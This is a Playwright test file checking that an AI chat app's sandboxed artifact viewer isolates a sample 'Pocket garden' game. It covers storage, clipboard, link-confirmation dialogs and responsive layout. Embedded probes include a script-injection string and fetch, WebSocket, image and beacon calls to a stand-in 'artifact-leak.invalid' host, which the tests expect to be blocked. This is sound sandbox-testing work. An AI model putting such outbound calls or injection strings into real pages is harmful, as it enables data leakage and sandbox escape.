import { randomUUID } from "node:crypto";
import { expect, test, type BrowserContext, type Page } from "@playwright/test";
import type { ThreadGeneratedArtifact } from "../../lib/contracts/chats";
import { memoryConsumerSettingsFixture } from "../support/memoryFixtures";
import { installMatrixCatalogFixture } from "./shell/catalogFixture";
import { expectNoHorizontalOverflow, expectTouchSafe, expectWithinViewport } from "./support/layoutAssertions";
import { authenticateWithLocalToken } from "./support/localAuth";

const sizes = [{ width: 1440, height: 900 }, { width: 1280, height: 640 }, { width: 768, height: 1024 },
  { width: 1024, height: 768 }, { width: 390, height: 844 }, { width: 844, height: 390 }];
const guide = "https://artifact-link.example/guide?data=" + "a".repeat(90);
const preview = (page: Page) => page.frameLocator("iframe.v2-artifact-frame");

function gardenHtml(version = 1) {
  return [
    '<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">',
    '<style>body{margin:0;background:#172d28;color:#edf3df;font:16px system-ui}main{max-width:600px;margin:auto;padding:24px;display:grid;gap:18px}h1,p{margin:0}h1{font-size:30px}small{color:#bbceb1}output{font-variant-numeric:tabular-nums}#score{font-size:60px}button,input,a{font:inherit}button,a{padding:12px;border:0;border-radius:8px;background:#c5dfa6;color:#172d28}a{display:inline-block}input{box-sizing:border-box;max-width:100%;padding:10px;border-radius:6px}form,.actions{display:flex;flex-wrap:wrap;gap:10px;align-items:center}label{display:grid;gap:6px}details{border-top:1px solid #728774;padding-top:12px}details button{margin:6px 4px 0 0}</style>',
    '</head><body><main><small>Pocket garden · v' + version + '</small><h1>A little room to grow.</h1><output id="score">0</output>',
    '<div class="actions"><button id="grow">Grow one leaf</button><a href="' + guide + '">Read the guide</a></div>',
    '<form id="form"><label>Name your garden<input id="name" autocomplete="off"></label><button>Keep for this visit</button></form><output id="visit"></output>',
    '<div class="actions"><button id="download">Download CSV</button><button id="fullscreen">Fullscreen</button><button id="copy">Copy score</button></div><p id="result" role="status"></p>',
    '<details><summary>Browser boundary probes</summary><button id="markup">Save markup as data</button><button id="window">Open guide window</button><button id="requests">Try blocked requests</button><button id="top">Try top navigation</button><button id="navigate">Try frame navigation</button></details>',
    '<p id="instructions">Small changes stay in this browser.</p><a href="#instructions">Jump to instructions</a></main><script>',
    'const el=id=>document.getElementById(id);',
    'const update=()=>{el("score").textContent=localStorage.getItem("score")||"0";el("visit").textContent=sessionStorage.getItem("name")||"No visit name";};',
    'el("grow").onclick=()=>{localStorage.setItem("score",String(Number(localStorage.getItem("score")||0)+1));update();};',
    'el("form").onsubmit=event=>{event.preventDefault();sessionStorage.setItem("name",el("name").value);update();};',
    'el("markup").onclick=()=>{localStorage.setItem("markup","</scr"+"ipt><scr"+"ipt>window.injected=1</scr"+"ipt>");el("result").textContent="Markup saved as data";};',
    'el("window").onclick=()=>window.open("https://artifact-link.example/window");',
    'el("download").onclick=()=>{const url=URL.createObjectURL(new Blob(["leaves\\n"+el("score").textContent+"\\n"],{type:"text/csv"}));const a=document.createElement("a");a.href=url;a.download="garden.csv";a.click();setTimeout(()=>URL.revokeObjectURL(url),1000);};',
    'el("fullscreen").onclick=()=>document.documentElement.requestFullscreen().then(()=>el("result").textContent="Fullscreen enabled").catch(()=>el("result").textContent="Fullscreen unavailable");',
    'el("copy").onclick=()=>navigator.clipboard.writeText("Garden score: "+el("score").textContent).then(()=>el("result").textContent="Score copied").catch(()=>el("result").textContent="Clipboard unavailable");',
    'el("requests").onclick=()=>{fetch("https://artifact-leak.invalid/fetch").catch(()=>{});try{new WebSocket("wss://artifact-leak.invalid/socket");}catch{}const image=new Image();image.src="https://artifact-leak.invalid/image";try{navigator.sendBeacon("https://artifact-leak.invalid/beacon","fixture");}catch{}el("result").textContent="Blocked requests attempted";};',
    'el("top").onclick=()=>{try{top.location="https://artifact-leak.invalid/top";}catch{}el("result").textContent="Top navigation attempted";};',
    'el("navigate").onclick=()=>{location.href="https://artifact-leak.invalid/frame";};update();',
    '</script></body></html>'
  ].join("\n");
}

async function createFixture(page: Page) {
  await authenticateWithLocalToken(page.request);
  const title = "Pocket garden " + randomUUID().slice(0, 8);
  const chats: string[] = []; const artifacts: string[] = [];
  async function cleanup(errors: unknown[] = []) {
    try { await authenticateWithLocalToken(page.request); } catch (error) { errors.push(error); }
    for (const path of [...artifacts.map(id => "/api/artifacts/" + id), ...chats.map(id => "/api/chats/" + id)]) {
      try { const response = await page.request.delete(path); expect(response.ok() || response.status() === 404).toBe(true); }
      catch (error) { errors.push(error); }
    }
    if (errors.length === 1) throw errors[0];
    if (errors.length > 1) throw new AggregateError(errors, "Creative artifact scenario or cleanup failed");
  }
  try {
    const chat = await page.request.post("/api/chats", { data: { title, memoryMode: "EXCLUDED" } });
    expect(chat.status()).toBe(201); const chatId: string = (await chat.json()).chat.id; chats.push(chatId);
    const response = await page.request.post("/api/artifacts", { data: { sourceChatId: chatId, operation: {
      intent: "create", kind: "game", title, entrypoint: "index.html", files: [{ path: "index.html", mimeType: "text/html", text: gardenHtml() }]
    } } });
    expect(response.status()).toBe(201); const version = (await response.json()).version; artifacts.push(version.artifactId);
    const artifact: ThreadGeneratedArtifact = { artifactId: version.artifactId, versionId: version.id, versionNumber: 1, title, kind: "game", entrypoint: "index.html" };
    const privatePath = "/artifacts/" + artifact.artifactId + "/versions/" + artifact.versionId;
    const publish = async (versionId = artifact.versionId) => {
      const result = await page.request.post("/api/artifacts/" + artifact.artifactId + "/publish", { data: { versionId } });
      expect(result.status()).toBe(201); return (await result.json()).publication.publicPath as string;
    };
    return { artifact, chatId, privatePath, publish, cleanup };
  } catch (error) { await cleanup([error]); throw error; }
}

async function installChat(page: Page, fixture: Awaited<ReturnType<typeof createFixture>>) {
  const time = "2026-09-21T00:00:00.000Z";
  const messages = [{ id: "creative-question", role: "user", parentMessageId: null, text: "Create a pocket garden." },
    { id: "creative-answer", role: "assistant", parentMessageId: "creative-question", text: "Your garden is ready." }]
    .map(message => ({ ...message, createdAt: time, content: { blocks: [{ type: "text", text: message.text }] }, status: "complete", errorMessage: null,
      modelId: message.role === "assistant" ? "gpt-5.5" : null, modelRunId: message.role === "assistant" ? "creative-run" : null,
      provider: message.role === "assistant" ? "openai" : null,
      artifactSummary: message.role === "assistant" ? { citations: [], sources: [], reasoningText: [], generatedArtifacts: [fixture.artifact] } : null }));
  await page.addInitScript(chatId => {
    if (window === window.top) localStorage.setItem("aiqsa.activeChatId", chatId);
  }, fixture.chatId);
  await installMatrixCatalogFixture(page, { folders: [], chats: [{ id: fixture.chatId, title: fixture.artifact.title, messages,
    activeLeafMessageId: "creative-answer", createdAt: time, updatedAt: time, defaultModelId: "gpt-5.5", defaultProvider: "openai",
    folderId: null, pinned: false, messageCount: 2, usageStats: null }] });
  await page.route("**/api/me/memory/settings", route => route.fulfill({ json: memoryConsumerSettingsFixture() }));
  await page.route("**/api/me/mcp", route => route.fulfill({ json: { servers: [] } }));
}

test("local state survives reload and versions while session state and publication namespaces stay separate", async ({ page, context, baseURL }) => {
  test.setTimeout(90_000);
  const fixture = await createFixture(page); const errors: unknown[] = [];
  try {
    await context.grantPermissions(["clipboard-read", "clipboard-write"], { origin: new URL(baseURL!).origin });
    await page.goto(fixture.privatePath);
    const frame = preview(page);
    await expect(page.locator("iframe.v2-artifact-frame")).toHaveAttribute("sandbox", "allow-scripts allow-forms allow-pointer-lock allow-downloads");
    await expect(page.locator("iframe.v2-artifact-frame")).toHaveAttribute("allow", "fullscreen; clipboard-write");
    await frame.getByRole("button", { name: "Grow one leaf" }).click();
    await expect(frame.locator("#score")).toHaveText("1");
    await expect.poll(() => page.evaluate(id => localStorage.getItem("aiqsa.artifact.state." + id), fixture.artifact.artifactId)).toContain('"score","1"');
    await frame.getByRole("textbox", { name: "Name your garden" }).fill("Fern");
    await frame.getByRole("textbox", { name: "Name your garden" }).press("Enter");
    await expect(frame.locator("#visit")).toHaveText("Fern");
    await frame.getByRole("link", { name: "Jump to instructions" }).click();
    await expect(frame.locator("#score")).toHaveText("1");
    await expect(page.locator('.v2-artifact-banner[role="alert"]')).toHaveCount(0);
    expect(await page.evaluate(id => localStorage.getItem("aiqsa.artifact.state." + id), fixture.artifact.artifactId)).not.toContain("Fern");
    await frame.getByRole("button", { name: "Copy score" }).click();
    await expect(frame.locator("#result")).toHaveText("Score copied");
    expect(await page.evaluate(() => navigator.clipboard.readText())).toBe("Garden score: 1");
    const downloadPromise = page.waitForEvent("download");
    await frame.getByRole("button", { name: "Download CSV" }).click();
    expect((await downloadPromise).suggestedFilename()).toBe("garden.csv");
    await frame.getByRole("button", { name: "Fullscreen", exact: true }).click();
    await expect(frame.locator("#result")).toHaveText("Fullscreen enabled");
    await page.evaluate(() => document.exitFullscreen());
    await frame.getByText("Browser boundary probes", { exact: true }).click();
    await frame.getByRole("button", { name: "Save markup as data" }).click();
    await expect.poll(() => page.evaluate(id => localStorage.getItem("aiqsa.artifact.state." + id), fixture.artifact.artifactId)).toContain("</script>");
    await page.reload();
    await expect(frame.locator("#score")).toHaveText("1");
    await expect(frame.locator("#visit")).toHaveText("No visit name");
    expect(await frame.locator("body").evaluate(() => Object.hasOwn(window, "injected"))).toBe(false);
    const updated = await page.request.post("/api/artifacts", { data: { artifactId: fixture.artifact.artifactId, sourceChatId: fixture.chatId, operation: {
      intent: "update", baseVersionId: fixture.artifact.versionId, kind: "game", title: fixture.artifact.title, entrypoint: "index.html",
      files: [{ path: "index.html", mimeType: "text/html", text: gardenHtml(2) }]
    } } });
    expect(updated.status()).toBe(201); const second = (await updated.json()).version;
    await page.goto("/artifacts/" + fixture.artifact.artifactId + "/versions/" + second.id);
    await expect(frame.locator("#score")).toHaveText("1");
    const publication = await fixture.publish(second.id);
    await page.goto(publication); await expect(frame.locator("#score")).toHaveText("0");
    await frame.getByRole("button", { name: "Grow one leaf" }).click();
    await expect.poll(() => page.evaluate(() => Object.keys(localStorage).filter(key => key.startsWith("aiqsa.artifact.state.pub.")).length)).toBe(1);
    await page.reload(); await expect(frame.locator("#score")).toHaveText("1");
    await page.goto(await fixture.publish(second.id)); await expect(frame.locator("#score")).toHaveText("0");
    await frame.getByRole("button", { name: "Grow one leaf" }).click();
    await page.getByRole("button", { name: "Artifact actions" }).click();
    await page.getByRole("menuitem", { name: "Reset saved state" }).click();
    await expect(frame.locator("#score")).toHaveText("0");
    expect(await page.evaluate(id => localStorage.getItem("aiqsa.artifact.state." + id), fixture.artifact.artifactId)).toContain('"score","1"');
    await installChat(page, fixture); await page.goto("/");
    await page.getByRole("button", { name: "Account menu" }).click();
    await page.getByRole("menu", { name: "Account", exact: true }).getByRole("menuitem", { name: "Sign out", exact: true }).click();
    await expect(page).toHaveURL(/\/login/u);
    expect(await page.evaluate(() => Object.keys(localStorage).filter(key => key.startsWith("aiqsa.artifact.state.")))).toEqual([]);
  } catch (error) { errors.push(error); } finally { await fixture.cleanup(errors); }
});

test("confirmed links keep their full address, focus and layout in private and anonymous viewers", async ({ page, browser, baseURL }, testInfo) => {
  test.setTimeout(150_000);
  const fixture = await createFixture(page); const errors: unknown[] = [];
  let anonymous: BrowserContext | undefined;
  try {
    anonymous = await browser.newContext({ baseURL, reducedMotion: "reduce" });
    await installChat(page, fixture); await page.goto("/");
    await page.getByRole("button", { name: "Open artifact: " + fixture.artifact.title, exact: true }).click();
    await page.getByRole("button", { name: "Expand artifact", exact: true }).click();
    const publicPage = await anonymous.newPage(); await publicPage.goto(await fixture.publish());
    for (const [surface, target] of [["private", page], ["public", publicPage]] as const) {
      await preview(target).getByRole("link", { name: "Read the guide" }).click();
      const dialog = target.getByRole("dialog", { name: "Open external link?" });
      await expect(dialog).toBeVisible();
      await expect(dialog.getByLabel("Full link address")).toHaveText(guide);
      await expect(dialog.getByText("This link carries additional data in its address.")).toBeVisible();
      await expect(dialog.getByRole("button", { name: "Cancel" })).toBeFocused();
      for (const theme of ["light", "dark"]) {
        await target.evaluate(value => { document.documentElement.dataset.theme = value; document.documentElement.dataset.colorScheme = value; }, theme);
        for (const size of sizes) {
          await target.setViewportSize(size); await expectNoHorizontalOverflow(target);
          await expectWithinViewport(target, dialog.getByRole("button", { name: "Cancel" }));
          await target.screenshot({ path: testInfo.outputPath("artifact-link-" + surface + "-" + theme + "-" + size.width + "x" + size.height + ".png") });
        }
      }
      await dialog.getByRole("button", { name: "Cancel" }).click();
      expect(target.context().pages()).toHaveLength(1);
    }
    // Every confirmed visit is explicit and no popup receives an opener.
    await anonymous.route("https://artifact-link.example/**", route => route.fulfill({ contentType: "text/html", body: "<h1>Fixture destination</h1>" }));
    await preview(publicPage).getByText("Browser boundary probes", { exact: true }).click();
    await preview(publicPage).getByRole("button", { name: "Open guide window" }).click();
    const popupPromise = anonymous.waitForEvent("page");
    await publicPage.getByRole("dialog", { name: "Open external link?" }).getByRole("button", { name: "Open link", exact: true }).click();
    const popup = await popupPromise; await popup.waitForLoadState();
    expect(await popup.evaluate(() => window.opener)).toBeNull(); await popup.close();
  } catch (error) { errors.push(error); } finally {
    try { await anonymous?.close(); } catch (error) { errors.push(error); }
    await fixture.cleanup(errors);
  }
});

test("touch links remain usable across phone and tablet orientations without losing the running preview", async ({ page, browser, baseURL }, testInfo) => {
  test.setTimeout(90_000);
  const fixture = await createFixture(page); const errors: unknown[] = [];
  let touch: BrowserContext | undefined;
  try {
    touch = await browser.newContext({ baseURL, isMobile: true, hasTouch: true, reducedMotion: "reduce", viewport: { width: 390, height: 844 } });
    const target = await touch.newPage(); await target.goto(await fixture.publish());
    await preview(target).getByRole("button", { name: "Grow one leaf" }).tap();
    await preview(target).getByRole("link", { name: "Read the guide" }).tap();
    const dialog = target.getByRole("dialog", { name: "Open external link?" });
    for (const [index, size] of sizes.slice(2).entries()) {
      await target.setViewportSize(size);
      await target.evaluate(theme => { document.documentElement.dataset.theme = theme; document.documentElement.dataset.colorScheme = theme; }, index < 2 ? "dark" : "light");
      const cancel = dialog.getByRole("button", { name: "Cancel" });
      await expectWithinViewport(target, cancel); await expectTouchSafe(cancel); await expectNoHorizontalOverflow(target);
      await target.screenshot({ path: testInfo.outputPath("artifact-link-touch-" + size.width + "x" + size.height + ".png") });
    }
    await dialog.getByRole("button", { name: "Cancel" }).tap();
    await expect(preview(target).locator("#score")).toHaveText("1");
  } catch (error) { errors.push(error); } finally {
    try { await touch?.close(); } catch (error) { errors.push(error); }
    await fixture.cleanup(errors);
  }
});

test("artifact requests and independent navigation remain blocked on every viewer surface", async ({ page }, testInfo) => {
  test.setTimeout(120_000);
  const fixture = await createFixture(page); const errors: unknown[] = [];
  try {
    await installChat(page, fixture);
    const publication = await fixture.publish(); const outbound: string[] = [];
    let attemptedRequests = 0; let blockedRequests = 0;
    page.on("request", request => { if (request.url().includes("artifact-leak.invalid")) attemptedRequests++; });
    page.on("requestfailed", request => { if (request.url().includes("artifact-leak.invalid")) blockedRequests++; });
    page.on("websocket", socket => { if (socket.url().includes("artifact-leak.invalid")) outbound.push("socket"); });
    // Chromium emits a request event even for CSP-blocked images. Interception
    // is reached only when CSP permits dispatch; abort there as a final guard.
    await page.route("**://artifact-leak.invalid/**", route => { outbound.push("request"); return route.abort(); });
    for (const surface of ["standalone", "public", "chat", "library"]) {
      await page.goto(surface === "standalone" ? fixture.privatePath : surface === "public" ? publication : "/");
      if (surface === "chat") await page.getByRole("button", { name: "Open artifact: " + fixture.artifact.title, exact: true }).click();
      if (surface === "library") {
        await page.getByRole("navigation", { name: "Workspace" }).getByRole("button", { name: "Library", exact: true }).click();
        await page.getByTestId("library-v2").getByRole("tab", { name: "Artifacts", exact: true }).click();
        await page.getByTestId("library-artifacts-panel").getByRole("searchbox", { name: "Search artifacts" }).fill(fixture.artifact.title);
        await page.getByRole("button", { name: "Open " + fixture.artifact.title, exact: true }).click();
      }
      const before = page.url(); const frame = preview(page);
      await frame.getByText("Browser boundary probes", { exact: true }).click();
      await frame.getByRole("button", { name: "Try blocked requests" }).click();
      await expect(frame.locator("#result")).toHaveText("Blocked requests attempted");
      await frame.getByRole("button", { name: "Try top navigation" }).click();
      await expect(frame.locator("#result")).toHaveText("Top navigation attempted");
      await frame.getByRole("button", { name: "Try frame navigation" }).click();
      await expect.poll(() => page.frames().some(candidate => candidate.url().includes("artifact-leak.invalid"))).toBe(false);
      await expect.poll(() => blockedRequests).toBe(attemptedRequests);
      expect(page.url()).toBe(before); expect(outbound, surface).toEqual([]);
    }
    await testInfo.attach("artifact-network-boundary", { body: JSON.stringify({ surfaces: 4, outboundRequests: outbound.length, blockedRequests }), contentType: "application/json" });
  } catch (error) { errors.push(error); } finally { await fixture.cleanup(errors); }
});
